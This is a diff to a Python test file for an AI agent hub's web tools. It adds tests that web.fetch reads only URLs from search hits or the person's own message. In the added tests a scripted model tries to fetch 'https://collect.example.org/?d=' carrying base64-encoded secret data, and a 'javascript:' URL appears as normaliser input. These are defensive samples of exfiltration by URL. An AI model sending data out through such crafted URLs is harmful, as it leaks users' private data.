@@ -39,6 +39,11 @@ SEARCHED = {
 @pytest.fixture
 def web_node(client: TestClient, connect) -> tuple[str, FakeNode]:
     """A tool node that offers web.search and web.fetch (the node enforces the rest)."""
+    return a_web_node(client, connect)
+
+
+def a_web_node(client: TestClient, connect, url_origin: bool = False) -> tuple[str, FakeNode]:
+    """``url_origin``: the node's web.fetch reads only its own hits unless the hub vouches."""
     node_id, key = pair(client, "tools-alpha", role="tools")
     node = connect(node_id, key)
     inv = tools_inventory()
@@ -49,6 +54,7 @@ def web_node(client: TestClient, connect) -> tuple[str, FakeNode]:
                 "description": f"{name} (test)",
                 "read_only": True,
                 "input_schema": {"type": "object", "additionalProperties": True},
+                **({"url_origin": True} if url_origin and name == "web.fetch" else {}),
             }
         )
     node.inventory = inv
@@ -65,13 +71,13 @@ def web_node(client: TestClient, connect) -> tuple[str, FakeNode]:
     return node_id, node
 
 
-def started(client: TestClient) -> str:
+def started(client: TestClient, prompt: str = "why does web restart?") -> str:
     """Start a task; the hub learns the node's capabilities a moment after the node reports them,
     so a start that is refused (409 ``no_capabilities``) is tried again briefly; the last
     refusal is the assertion message."""
 
     def accepted() -> str:
-        r = start(client)
+        r = start(client, prompt)
         assert r.status_code == 201, r.text
         return r.json()["id"]
 
@@ -241,13 +247,16 @@ def test_a_refusal_of_the_nodes_own_guard_keeps_no_secret_in_audit_or_steps(
             "message": "the URL contains private data (internal-name)",
         }
     }
-    # a name only the node knows (the hub's own list does not): the hub lets it through
+    # a name only the node knows (the hub's own list does not): the hub lets it through (the
+    # person gave the URL, so it is no made-up one either)
     use(
         client,
         tool("tools-alpha", "web.fetch", url="https://wiki.corp-only.example/page"),
         finish("Gave up."),
     )
-    t = wait_for(client, started(client), "done")
+    t = wait_for(
+        client, started(client, "what does https://wiki.corp-only.example/page say?"), "done"
+    )
     obs = next(s for s in t["steps"] if s["kind"] == "observation")["data"]
     assert obs["tool"]["code"] == "private_data" and obs["tool"]["input"] == {}
     assert "corp-only" not in obs["text"]
@@ -370,3 +379,126 @@ def test_a_web_tool_whose_calls_are_all_refused_is_closed() -> None:
     assert b.closed("web.search")
     assert not b.closed("web.fetch")
     assert not b.closed("repo.read")
+
+
+# --- where a fetched URL comes from (security audit 2026-11-27, finding 03) ---------------------
+
+
+def test_urls_in_a_message_are_read_as_a_person_writes_them() -> None:
+    text = (
+        "Read https://Docs.Example.org/a?x=1. Then (see https://example.org/b) and "
+        "https://example.org/wiki/Foo_(bar), «https://example.org/c»; ftp://example.org/no"
+    )
+    assert web_access.urls_in(text) == {
+        "https://docs.example.org/a?x=1",
+        "https://example.org/b",
+        "https://example.org/wiki/Foo_(bar)",
+        "https://example.org/c",
+    }
+    assert web_access.url_key("HTTPS://u:p@Example.org#top") == "https://example.org/"
+    assert web_access.url_key("https://example.org:8443/x") == "https://example.org:8443/x"
+    assert web_access.url_key("javascript:alert(1)") == "" and web_access.url_key("") == ""
+
+
+def test_a_run_fetches_only_its_hits_and_the_persons_urls() -> None:
+    o = web_access.WebOrigins()
+    o.of_person("please summarise https://example.org/article")
+    o.note("web.search", SEARCHED)
+    o.note(
+        "web.images",
+        {"results": [{"image": "https://img.example.org/a.png", "thumbnail": None, "page": 3}]},
+    )
+    o.note(
+        "web.fetch",
+        {"url": "https://example.org/moved", "images": [{"url": "https://example.org/p.png"}]},
+    )
+    for url in (
+        "https://example.org/article",
+        "https://docs.example.org/oom#section",  # a hit; the fragment is no new data
+        "https://example.org/moved",
+        "https://example.org/p.png",
+        "https://img.example.org/a.png",
+    ):
+        assert o.allows(url), url
+    assert o.is_person("https://example.org/article") and not o.is_person(
+        "https://docs.example.org/oom"
+    )
+    for url in (
+        "https://docs.example.org/oom?d=c2VjcmV0",  # a hit with data added
+        "https://collect.example.org/?d=c2VjcmV0",  # made up
+    ):
+        assert not o.allows(url)
+        assert "did not come from this run" in (o.refusal("web.fetch", {"url": url}) or "")
+    assert o.refusal("web.search", {"query": "x"}) is None
+
+
+def test_the_budget_holds_the_origin_rule_and_reading_on_is_not_refused() -> None:
+    b = web_access.WebBudget(max_searches=3, max_fetches=2)
+    made_up = {"url": "https://collect.example.org/?d=1"}
+    assert "did not come from this run" in (b.url_refusal("web.fetch", made_up) or "")
+    b.note_result("web.search", SEARCHED, "E1", {"query": "q"})
+    hit = {"url": "https://docs.example.org/oom"}
+    assert b.url_refusal("web.fetch", hit) is None
+    # a picture for the report: only one the run was shown
+    pic = {"image_url": "https://img.example.org/a.png", "page_url": "x", "caption": "c"}
+    assert "picture URL did not come" in (b.refusal(web_access.REPORT_IMAGE, pic) or "")
+    b.note_result("web.images", {"results": [{"image": "https://img.example.org/a.png"}]}, "E2")
+    assert b.refusal(web_access.REPORT_IMAGE, pic) is None
+    # a page that was read (its address redirected) is read on without a new check
+    b.read.add("https://old.example.org/x")
+    assert b.url_refusal("web.fetch", {"url": "https://old.example.org/x"}) is None
+
+
+def test_a_made_up_url_never_reaches_the_node_and_is_audited_without_it(
+    client: TestClient, web_node
+) -> None:
+    node_id, node = web_node
+    url = "https://collect.example.org/?d=c2VjcmV0LWZyb20tYS1maWxl"
+    model = use(client, tool("tools-alpha", "web.fetch", url=url), finish("Gave up."))
+    t = wait_for(client, started(client), "done")
+    assert node.capability_calls == []
+    obs = next(s for s in t["steps"] if s["kind"] == "observation")["data"]
+    assert obs["tool"]["code"] == "url_not_given" and obs["tool"]["input"] == {}
+    assert "did not come from this run" in obs["text"] and "search for the page" in obs["text"]
+    (row,) = _audit(node_id)
+    assert (row["capability"], row["ok"], row["code"]) == ("web.fetch", False, "url_not_given")
+    assert "c2VjcmV0" not in str(row)
+    assert len(model.calls) == 2
+
+
+def test_the_hub_vouches_for_the_persons_url_only_to_a_node_that_checks(
+    client: TestClient, connect
+) -> None:
+    node_id, node = a_web_node(client, connect, url_origin=True)
+    use(
+        client,
+        tool("tools-alpha", "web.fetch", url="https://example.org/article"),
+        tool("tools-alpha", "web.search", query="container oom restart"),
+        tool("tools-alpha", "web.fetch", url="https://docs.example.org/oom"),
+        finish(),
+    )
+    prompt = "what does https://example.org/article say about it?"
+    wait_for(client, started(client, prompt), "done")
+    fetches = [c for c in node.capability_calls if c["capability"] == "web.fetch"]
+    # the person's URL is vouched for; a hit is not (the node knows its own hits)
+    assert [c.get("url_origin") for c in fetches] == ["person", None]
+    # a call the person makes by hand is the person's own
+    r = client.post(
+        f"/api/nodes/{node_id}/capabilities/web.fetch",
+        headers=AUTH,
+        json={"input": {"url": "https://example.org/typed"}},
+    )
+    assert r.status_code == 200, r.text
+    assert node.capability_calls[-1].get("url_origin") == "person"
+
+
+def test_a_node_that_does_not_check_gets_no_url_origin(client: TestClient, web_node) -> None:
+    """An older node refuses an unknown key of capability.invoke: it is never sent one."""
+    node_id, node = web_node
+    r = client.post(
+        f"/api/nodes/{node_id}/capabilities/web.fetch",
+        headers=AUTH,
+        json={"input": {"url": "https://example.org/typed"}},
+    )
+    assert r.status_code == 200, r.text
+    assert "url_origin" not in node.capability_calls[-1]
